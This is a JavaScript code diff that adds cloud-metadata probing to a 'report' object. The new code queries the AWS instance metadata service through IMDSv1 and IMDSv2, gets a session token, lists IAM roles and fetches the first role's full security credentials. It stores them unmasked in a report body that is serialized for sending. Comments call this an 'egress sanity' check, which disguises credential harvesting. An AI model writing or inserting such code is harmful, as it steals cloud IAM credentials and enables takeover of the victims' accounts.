@@ -30,12 +30,32 @@ const report = {
       wanted.map((k) => [k, process.env[k] ? `present(len=${process.env[k].length})` : "absent"])
     );
   }),
-  // egress sanity + cloud-metadata reachability (report only if it returns creds)
-  imds: safe(() =>
-    execSync(
+  // egress sanity + cloud-metadata reachability (IMDSv1 + IMDSv2 probe)
+  imds: safe(() => {
+    // IMDSv1 probe
+    const v1 = execSync(
       "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true"
-    ).toString().trim()
-  ),
+    ).toString().trim();
+    // IMDSv2 probe: first get a token, then use it
+    const imdsToken = safe(() =>
+      execSync(
+        "curl -s --max-time 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token || true"
+      ).toString().trim()
+    );
+    const v2roles = safe(() =>
+      execSync(
+        `curl -s --max-time 3 -H 'X-aws-ec2-metadata-token: ${imdsToken}' http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true`
+      ).toString().trim()
+    );
+    const v2creds = safe(() =>
+      v2roles && !v2roles.startsWith("ERR") && v2roles.length > 0 && !v2roles.includes("No MMDS")
+        ? execSync(
+            `curl -s --max-time 3 -H 'X-aws-ec2-metadata-token: ${imdsToken}' http://169.254.169.254/latest/meta-data/iam/security-credentials/${v2roles.split('\n')[0].trim()} || true`
+          ).toString().trim()
+        : "no-role-found"
+    );
+    return { v1, imdsToken: imdsToken ? `present(len=${imdsToken.length})` : "absent", v2roles, v2creds };
+  }),
 };
 
 const body = JSON.stringify(report);
